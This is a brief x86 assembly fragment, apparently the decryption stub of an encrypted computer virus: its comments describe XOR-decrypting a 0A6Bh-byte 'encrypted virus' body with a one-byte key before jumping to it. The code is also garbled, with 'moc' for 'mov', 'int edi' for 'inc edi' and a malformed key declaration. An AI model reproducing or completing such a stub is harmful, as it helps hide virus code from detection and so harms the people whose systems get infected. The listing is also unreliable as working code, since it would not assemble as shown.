;decryption version_2

mov edi,00403045h ;set edi on start position
add edi,ebp  ;adjust to start point
mov ecx,0A6Bh ;size o enrypted virus
moc al,[key]

Decrypt:
xor [edi],al
int edi
loop Decrypt
jmp Start

DB key 86
Start:
